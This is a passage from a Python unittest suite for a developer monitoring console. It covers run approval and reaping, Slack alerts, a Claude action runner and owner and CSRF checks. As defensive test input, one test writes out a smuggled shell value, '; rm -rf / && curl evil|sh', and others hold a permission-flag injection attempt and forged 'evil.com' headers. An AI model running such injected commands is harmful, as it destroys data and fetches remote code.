        self.assertTrue(MSG.run_mark_running(res['run_id'], '@1'))

    def test_mark_running_false_after_terminal(self):
        # #4: if stop/reap terminates a run while launching, mark_running is False → caller kills the window
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_stop(res['run_id'])                     # starting→stopped (no target)
        self.assertFalse(MSG.run_mark_running(res['run_id'], '@1'))

    def _future(self):
        return MSG.now_utc() + timedelta(seconds=MSG.REAP_GRACE_S + 30)

    def test_reap_interrupts_dead_window(self):
        # a recorded target window disappeared after grace → interrupted (generation-aware pid:@N format)
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@9')
        MSG.reap_runs(set(), now=self._future())         # no live window + after grace → interrupted
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'interrupted')

    def test_reap_keeps_alive_window(self):
        # correlation uses the generation-aware key (pid:window_id)
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@9')
        MSG.reap_runs({'p1:@9'}, now=self._future())      # target alive → retain
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_grace_skips_fresh(self):
        # when just launched (age < grace), do not interrupt even if absent from the snapshot (absorbs false interrupts)
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@9')
        MSG.reap_runs(set())                              # now = current time → age ≈ 0 < grace → skip
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_leaves_targetless_alone(self):
        # #4/#5/#6 root-cause fix: the reaper never touches an unrecorded target (launching/crash orphan).
        # whether grace passes or a same-named window exists or not — preserve starting and the card lock (prevents double execution).
        # It terminates when the sentinel records normal completion.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)   # starting, target NULL
        MSG.reap_runs({'@42'}, now=self._future())        # untouched even after grace
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'starting')
        self.assertIsNone(MSG.get_run(res['run_id'])['tmux_target'])
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertEqual(card['run_id'], res['run_id'])   # card lock retained → prevents double execution
        # a later sentinel termination releases it normally
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'done')

    def test_reap_ignores_stale_window_collision(self):
        # round 6: even when a same-named window left by a login shell after completion overlaps in name with a future run, correlation by window_id
        # alone prevents misidentifying the new run's normal window. If the new run's target is in the alive set, retain it
        # — regardless of whether another stale window has the same name.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@42')     # new run's actual window
        # even if stale window @7 remains with the same name, retain the new run when @42 is alive
        MSG.reap_runs({'p1:@7', 'p1:@42'}, now=self._future())
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_grace_uses_started_at_not_created(self):
        # round 7 High1: even if launching is delayed and created_at is old, immediately after recording the target (started_at)
        # grace must protect it. Reap must use only started_at (created_at would interrupt → double execution).
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@42')     # started_at = now
        with MSG._conn() as c:                            # backdate created_at by two minutes (launch-delay simulation)
            c.execute("UPDATE runs SET created_at=? WHERE run_id=?",
                      (MSG.iso(MSG.now_utc() - timedelta(seconds=120)), res['run_id']))
        # the window is absent from the snapshot (straddle), now = started_at + 5s (< grace)
        MSG.reap_runs(set(), now=MSG.now_utc() + timedelta(seconds=5))
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_generation_distinguishes_reused_window_id(self):
        # round 7 High2: a server restart reuses window_id (@0) → distinguish by pid (generation). The stale generation (p1:@0)
        # is absent from new-generation alive set (p2:@0), so interrupt it; retain the new run (p2:@0) → prevents killing the wrong window.
        a = self._action(event_id='a1', group_key='ga')
        ra = MSG.redeem_approval(a, MSG.issue_approval(a, self.cfg)['nonce'], self.cfg)
        b = self._action(event_id='a2', group_key='gb')
        rb = MSG.redeem_approval(b, MSG.issue_approval(b, self.cfg)['nonce'], self.cfg)
        MSG.run_mark_running(ra['run_id'], 'p1:@0')       # old server generation
        MSG.run_mark_running(rb['run_id'], 'p2:@0')       # new server generation (same window_id, different pid)
        MSG.reap_runs({'p2:@0'}, now=self._future())      # only the new server exists
        self.assertEqual(MSG.get_run(ra['run_id'])['status'], 'interrupted')  # stale generation terminated
        self.assertEqual(MSG.get_run(rb['run_id'])['status'], 'running')      # new run retained

    def test_reap_never_terminates_legacy_target(self):
        # round 8 defense: a generationless legacy format (@N) cannot be compared to a new pid:@N key → the reaper never terminates it
        # (clearing a live card lock = double-execution risk). Do not suffix-adopt because it reopens High2.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@42')        # legacy format (no colon)
        MSG.reap_runs({'12345:@42'}, now=self._future())  # new generation key — does not exact-match legacy
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')  # not terminated
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertEqual(card['run_id'], res['run_id'])   # card lock retained → prevents double execution

    # ---- view-session decision — the path that lets the modal view only that run's window ----
    def _running(self, target, event_id='v1', group_key='gv'):
        cid = self._action(event_id=event_id, group_key=group_key)
        res = MSG.redeem_approval(cid, MSG.issue_approval(cid, self.cfg)['nonce'], self.cfg)
        if target is not None:
            MSG.run_mark_running(res['run_id'], target)
        return res['run_id']

    def test_view_request_ok(self):
        rid = self._running('p1:@42')
        ok, p = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertTrue(ok)
        self.assertEqual(p['view'], 'devmon-view-' + rid)
        self.assertEqual(p['window_id'], '@42')
        self.assertEqual(p['target'], 'p1:@42')

    def test_view_request_stale_generation(self):
        # a different window inherited @42 after server restart — attaching based only on window_id would view another run.
        rid = self._running('p1:@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p9:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'stale_generation')

    def test_view_request_window_gone(self):
        rid = self._running('p1:@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), set(), 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'stale_generation')

    def test_view_request_legacy_target_format(self):
        # a legacy target without a generation (pid) cannot be compared → never attach it
        rid = self._running('@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'stale_target_format')

    def test_view_request_launching_when_targetless(self):
        rid = self._running(None)                       # starting, target NULL
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'launching')

    def test_view_request_tmux_unavailable_is_not_stale(self):
        # mistaking an indeterminate alive query (None) for 'no window' blocks viewing a live run → defer the decision
        rid = self._running('p1:@42')
        ok, err = MSG.run_view_request(MSG.get_run(rid), None, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'tmux_unavailable')

    def test_view_request_not_active_after_finish(self):
        rid = self._running('p1:@42')
        MSG.run_finish(rid, 0)
        ok, err = MSG.run_view_request(MSG.get_run(rid), {'p1:@42'}, 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'not_active')

    def test_view_request_not_found(self):
        ok, err = MSG.run_view_request(None, set(), 'devmon-exec')
        self.assertFalse(ok)
        self.assertEqual(err, 'not_found')

    def test_view_session_name_survives_devterm_normalization(self):
        # devterm-shell converts [^A-Za-z0-9_-] to '_' — if a view name leaves that character set,
        # a wrong session (devmon-view-run_2026…) is silently created.
        rid = self._running('p1:@42')
        name = MSG.run_view_session(rid)
        self.assertEqual(name, re.sub(r'[^A-Za-z0-9_-]', '_', name))
        self.assertTrue(name.startswith(MSG.VIEW_SESSION_PREFIX))

    def test_active_view_sessions_tracks_lifecycle(self):
        a = self._running('p1:@1', event_id='va', group_key='gva')
        b = self._running('p1:@2', event_id='vb', group_key='gvb')
        self.assertEqual(MSG.active_view_sessions(),
                         {'devmon-view-' + a, 'devmon-view-' + b})
        MSG.run_finish(a, 0)
        self.assertEqual(MSG.active_view_sessions(), {'devmon-view-' + b})
        MSG.run_stop(b)
        self.assertEqual(MSG.active_view_sessions(), set())

    def test_link_not_executable(self):
        MSG.ingest(msg(kind='link'))
        cid = MSG._conn().execute("SELECT card_id FROM cards WHERE kind='link'").fetchone()['card_id']
        res = MSG.issue_approval(cid, self.cfg)
        self.assertEqual(res['error'], 'not_executable')

    def test_skill_drift_invalidates_nonce(self):
        # the card's own action changes after approval → the re-derived SHA disagrees → plan_stale.
        # Drifting the card (not the config) is the case that matters: what the owner read and
        # clicked is no longer what would run.
        cid = self._action(skill='harness-gardener')
        appr = MSG.issue_approval(cid, self.cfg)
        row = MSG._conn().execute('SELECT action_json FROM cards WHERE card_id=?', (cid,)).fetchone()
        action = json.loads(row['action_json'])
        action['skill'] = 'other-skill'
        with MSG._conn() as conn:
            conn.execute('UPDATE cards SET action_json=? WHERE card_id=?',
                         (json.dumps(action), cid))
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(res['error'], 'plan_stale')


class TestSlack(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_urgent_enqueues_worker_sends(self):
        MSG.ingest(msg(urgency='urgent'))
        due = MSG.claim_due_deliveries()
        self.assertEqual(len(due), 1)
        self.assertEqual(due[0]['title'], 'Disk 92%')
        MSG.delivery_sent(due[0]['id'], due[0]['card_id'])
        c = MSG._conn().execute('SELECT slack_sent_at, read_at FROM cards').fetchone()
        self.assertIsNotNone(c['slack_sent_at'])
        self.assertIsNone(c['read_at'])                  # Slack ≠ read (orthogonal)
        self.assertEqual(len(MSG.claim_due_deliveries()), 0)   # no longer due

    def test_normal_not_enqueued(self):
        MSG.ingest(msg(urgency='normal'))
        self.assertEqual(len(MSG.claim_due_deliveries()), 0)

    def test_retry_until_failed(self):
        MSG.ingest(msg(urgency='urgent'))
        for _ in range(MSG.MAX_DELIVERY_ATTEMPTS + 1):
            d = MSG._conn().execute('SELECT id, attempts, status FROM deliveries').fetchone()
            if d['status'] != 'pending':
                break
            MSG.delivery_retry(d['id'], d['attempts'], 'boom')
        st = MSG._conn().execute('SELECT status FROM deliveries').fetchone()['status']
        self.assertEqual(st, 'failed')

    def test_retry_then_success_clears(self):
        MSG.ingest(msg(urgency='urgent'))
        d = MSG._conn().execute('SELECT id, attempts, card_id FROM deliveries').fetchone()
        MSG.delivery_retry(d['id'], d['attempts'], 'boom')     # one failure → backoff
        self.assertEqual(len(MSG.claim_due_deliveries()), 0)   # during backoff = not due
        MSG.delivery_sent(d['id'], d['card_id'])               # subsequent success
        self.assertEqual(MSG._conn().execute(
            'SELECT status FROM deliveries').fetchone()['status'], 'sent')

    def test_format_text_has_title_no_url_leak(self):
        card = {'title': 'TUrgent', 'source': 's', 'kind': 'action',
                'urgency': 'urgent', 'occurrence_count': 3}
        t = devmon_slack.format_text(card, 'https://monitor.example.test/dev-monitor.html#messages')
        self.assertIn('TUrgent', t)
        self.assertIn('×3', t)
        self.assertIn('Open in the console', t)

    def test_slack_title_mrkdwn_escaped(self):
        # #9: escape <!channel> and <url|disguise> in a semi-trusted title so mrkdwn does not interpret them
        card = {'title': '<!channel> deploy failed <https://evil|details>', 'source': 's',
                'kind': 'info', 'urgency': 'urgent', 'occurrence_count': 1}
        t = devmon_slack.format_text(card, '')
        self.assertNotIn('<!channel>', t)
        self.assertNotIn('<https://evil|details>', t)
        self.assertIn('&lt;!channel&gt;', t)

    def test_flood_card_enqueues_slack(self):
        for i in range(MSG.FLOOD_THRESHOLD):
            MSG.ingest(msg(event_id='f%d' % i, group_key='noisy', urgency='normal'))
        # the synthetic flood card is also urgent → it enters deliveries
        titles = [d['title'] for d in MSG.claim_due_deliveries()]
        self.assertTrue(any('flood' in t for t in titles))


class TestRunner(unittest.TestCase):
    def test_prompt_is_single_argv_element(self):
        # even a prompt containing shell metacharacters is one argv element after '--' — no shell parsing (zero injection)
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '; rm -rf / && curl evil|sh'})
        self.assertIn('--', argv)
        self.assertEqual(argv[-1], '; rm -rf / && curl evil|sh')         # one element after '--'
        self.assertEqual(argv.index('--'), len(argv) - 2)

    def test_skill_argv(self):
        argv = action_runner.build_argv({'cwd': '/x', 'skill': 'harness-gardener'})
        self.assertEqual(argv[-1], '/harness-gardener')
        self.assertIn('--', argv)

    def test_exec_argv_direct(self):
        # exec = direct executable → bypasses Claude and '--', preserving argv elements (zero shell parsing)
        argv = action_runner.build_argv({'cwd': '/x', 'exec': ['/tmp/s.sh', '--flag', 'a b']})
        self.assertEqual(argv, ['/tmp/s.sh', '--flag', 'a b'])
        self.assertNotIn('claude', argv)
        self.assertNotIn('--', argv)

    def test_prompt_cannot_inject_cli_flag(self):
        # 🔴 #2: '--dangerously-skip-permissions' prompt is after '--', so it is positional rather than a CLI option
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '--dangerously-skip-permissions'})
        self.assertIn('--', argv)
        self.assertEqual(argv[-1], '--dangerously-skip-permissions')     # positional prompt
        self.assertEqual(argv.index('--'), len(argv) - 2)                # the prompt immediately follows '--'
        # there is no dangerous flag before '--'
        self.assertNotIn('--dangerously-skip-permissions', argv[:argv.index('--')])

    def test_resolve_cwd_under_root_ok(self):
        root = tempfile.mkdtemp()
        sub = os.path.join(root, 'proj'); os.mkdir(sub)
        self.assertEqual(action_runner.resolve_cwd_under_root(sub, root), os.path.realpath(sub))

    def test_resolve_cwd_escape_rejected(self):
        root = tempfile.mkdtemp(); outside = tempfile.mkdtemp()
        with self.assertRaises(ValueError):
            action_runner.resolve_cwd_under_root(outside, root)

    def test_sentinel_atomic(self):
        d = tempfile.mkdtemp()
        action_runner.write_sentinel(d, 'run-1', 3)
        with open(os.path.join(d, 'run-1.done')) as f:
            self.assertEqual(json.load(f)['exit_code'], 3)
        self.assertFalse(os.path.exists(os.path.join(d, 'run-1.tmp')))

    # --- PATH augmentation (🔴 2026-07-30 rc=127 regression) --------------------------------
    # tmux server env = systemd --user PATH → missing `~/.local/bin` → `claude` cannot resolve,
    # so all approved runs return 127. The following three tests catch that regression.

    def test_runtime_env_prepends_user_bin(self):
        env = {'PATH': '/usr/bin:/bin'}
        with unittest.mock.patch.dict(os.environ, env, clear=True):
            got = action_runner.runtime_env()['PATH'].split(os.pathsep)
        self.assertEqual(got[0], os.path.join(os.path.expanduser('~'), '.local', 'bin'))
        self.assertIn('/usr/bin', got)                       # the existing PATH is preserved

    def test_runtime_env_no_duplicate(self):
        userbin = os.path.join(os.path.expanduser('~'), '.local', 'bin')
        with unittest.mock.patch.dict(os.environ, {'PATH': userbin + ':/bin'}, clear=True):
            got = action_runner.runtime_env()['PATH'].split(os.pathsep)
        self.assertEqual(got.count(userbin), 1)

    def test_resolve_exe_finds_user_bin_only_executable(self):
        # an executable in ~/.local/bin must resolve even on an execution path that does not pass through a login shell
        home = tempfile.mkdtemp()
        ubin = os.path.join(home, '.local', 'bin'); os.makedirs(ubin)
        fake = os.path.join(ubin, 'claude-test-stub')
        with open(fake, 'w') as f:
            f.write('#!/bin/sh\nexit 0\n')
        os.chmod(fake, 0o755)
        with unittest.mock.patch.dict(os.environ, {'HOME': home, 'PATH': '/usr/bin:/bin'},
                                      clear=True):
            env = action_runner.runtime_env()
            self.assertEqual(action_runner.resolve_exe(['claude-test-stub'], env), fake)
            with self.assertRaises(FileNotFoundError) as cm:
                action_runner.resolve_exe(['no-such-exe-xyz'], env)
        self.assertIn('no-such-exe-xyz', str(cm.exception))   # what was requested
        self.assertIn('PATH=', str(cm.exception))             # where it was searched (No Silent Failure)

    # --- turn end = work complete (🔴 the Claude REPL does not exit when work is complete) -------------
    # Without this, a run remains running forever and its card stays locked (observed 2026-07-30: still running 43 minutes after completion).

    def test_turnend_settings_shape(self):
        d = tempfile.mkdtemp()
        path = action_runner.write_turnend_settings(d, 'run-x')
        cfg = json.load(open(path))
        hook = cfg['hooks']['Stop'][0]['hooks'][0]            # Claude Code Stop hook schema
        self.assertEqual(hook['type'], 'command')
        marker, _ = action_runner.turnend_paths(d, 'run-x')
        self.assertIn(marker, hook['command'])               # must be a command that writes the marker
        self.assertNotIn('rm ', hook['command'])             # must not be a destructive command

    def test_turnend_settings_quotes_are_escaped(self):
        # a single quote in the path must not break the hook command (the shell executes this string)
        d = tempfile.mkdtemp(prefix="it's-")
        path = action_runner.write_turnend_settings(d, 'run-y')
        cmd = json.load(open(path))['hooks']['Stop'][0]['hooks'][0]['command']
        self.assertIn("'\\''", cmd)
        rc = subprocess.call(['bash', '-c', cmd])            # must execute successfully
        self.assertEqual(rc, 0)
        self.assertTrue(os.path.exists(action_runner.turnend_paths(d, 'run-y')[0]))

    def test_settings_flag_before_double_dash(self):
        # if `--settings` comes after '--', it is treated as a prompt rather than an option — the order is contractual
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': 'hi'}, '/tmp/s.json')
        self.assertEqual(argv[:4], ['claude', '--settings', '/tmp/s.json', '--'])
        self.assertEqual(argv[-1], 'hi')
        self.assertLess(argv.index('--settings'), argv.index('--'))

    def test_exec_mode_gets_no_settings(self):
        # exec actually exits when it finishes, so no turn hook is needed and argv must remain unchanged
        argv = action_runner.build_argv({'cwd': '/x', 'exec': ['/bin/echo', 'a']}, '/tmp/s.json')
        self.assertEqual(argv, ['/bin/echo', 'a'])

    def test_watch_turnend_fires_once_and_consumes_marker(self):
        d = tempfile.mkdtemp()
        marker, _ = action_runner.turnend_paths(d, 'run-z')
        calls = []
        open(marker, 'w').close()
        stop = threading.Event()
        self.assertTrue(action_runner.watch_turnend(d, 'run-z', lambda: calls.append(1), stop,
                                                    poll=0.01))
        self.assertEqual(len(calls), 1)
        self.assertFalse(os.path.exists(marker))             # the marker is consumed (prevents repeated firing)

    def test_watch_turnend_stops_without_marker(self):
        d = tempfile.mkdtemp()
        stop = threading.Event(); stop.set()
        self.assertFalse(action_runner.watch_turnend(d, 'run-w', lambda: None, stop, poll=0.01))

    def test_cleanup_turnend_removes_both(self):
        d = tempfile.mkdtemp()
        action_runner.write_turnend_settings(d, 'run-c')
        marker, settings = action_runner.turnend_paths(d, 'run-c')
        open(marker, 'w').close()
        action_runner.cleanup_turnend(d, 'run-c')
        self.assertFalse(os.path.exists(marker))
        self.assertFalse(os.path.exists(settings))

    def test_cleanup_turnend_sweeps_orphans_but_keeps_fresh(self):
        # if a window is force-closed, cleanup does not run and another run's settings remain → sweep only stale ones
        d = tempfile.mkdtemp()
        old = action_runner.write_turnend_settings(d, 'run-old')
        fresh = action_runner.write_turnend_settings(d, 'run-fresh')
        os.utime(old, (0, 0))                                # 1970 = sufficiently old
        action_runner.cleanup_turnend(d, 'run-mine')
        self.assertFalse(os.path.exists(old))
        self.assertTrue(os.path.exists(fresh))               # do not remove settings for a running run


class FakeHeaders(dict):
    def get(self, k, default=''):
        return super().get(k, default)


class FakeHandler:
    def __init__(self, headers):
        self.headers = FakeHeaders(headers)
        self.status = None
        self.payload = None

    def _json(self, status, payload):
        self.status = status
        self.payload = payload


class TestOwnerGate(unittest.TestCase):
    def test_load_config_none(self):
        for k in devmon_owner._REQUIRED:
            os.environ.pop(k, None)
        self.assertIsNone(devmon_owner.load_config())

    def test_load_config_partial_fails_closed(self):
        os.environ['DEV_MONITOR_OWNER'] = 'owner@example.test'
        os.environ.pop('DEV_MONITOR_PROXY_SECRET', None)
        os.environ.pop('DEV_MONITOR_SPOOL', None)
        os.environ.pop('DEV_MONITOR_DB', None)
        with self.assertRaises(devmon_owner.ConfigError):
            devmon_owner.load_config()
        os.environ.pop('DEV_MONITOR_OWNER', None)

    def test_load_config_full(self):
        env = {'DEV_MONITOR_OWNER': 'owner@example.test',
               'DEV_MONITOR_PROXY_SECRET': 's3cr3t',
               'DEV_MONITOR_SPOOL': '/tmp/spool', 'DEV_MONITOR_DB': '/tmp/db'}
        os.environ.update(env)
        cfg = devmon_owner.load_config()
        self.assertEqual(cfg['owner'], 'owner@example.test')
        for k in env:
            os.environ.pop(k, None)

    CFG = {'owner': 'owner@example.test', 'secret': 's3cr3t',
           'spool': '/tmp/s', 'db': '/tmp/d'}

    def test_require_owner_ok(self):
        h = FakeHandler({'X-Devmon-Proxy-Secret': 's3cr3t',
                         'X-Devmon-Owner': 'owner@example.test'})
        self.assertTrue(devmon_owner.require_owner(h, self.CFG))

    def test_require_owner_forged_header_fails(self):
        # a local process forges only the owner header (does not know the secret) → 403 (C1)
        h = FakeHandler({'X-Devmon-Owner': 'owner@example.test'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG))
        self.assertEqual(h.status, 403)
        self.assertNotIn('error', h.payload)                # zero response-body data

    def test_require_owner_wrong_owner_fails(self):
        h = FakeHandler({'X-Devmon-Proxy-Secret': 's3cr3t',
                         'X-Devmon-Owner': 'attacker@evil.com'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG))

    def test_csrf_good_origin(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertTrue(devmon_owner.check_mutating(h))

    def test_csrf_origin_with_port_same_host_ok(self):
        # :9999 short URL access — Origin includes a port while nginx Host ($host) does not → pass by ignoring the port.
        h = FakeHandler({'Origin': 'http://monitor.example.test:9999', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertTrue(devmon_owner.check_mutating(h))

    def test_csrf_cross_host_with_port_rejected(self):
        # even ignoring the port, reject a different hostname (external-origin CSRF)
        h = FakeHandler({'Origin': 'https://evil.com:9999', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 403)

    def test_csrf_cross_origin_rejected(self):
        h = FakeHandler({'Origin': 'https://evil.com', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 403)

    def test_csrf_missing_origin_rejected(self):
        h = FakeHandler({'Host': 'monitor.example.test', 'Content-Type': 'application/json',
                         'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))

    def test_csrf_non_json_rejected(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'text/plain', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 415)

    def test_csrf_oversize_rejected(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json',
                         'Content-Length': str(devmon_owner.MAX_BODY + 1)})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 413)


if __name__ == '__main__':
    unittest.main(verbosity=2)
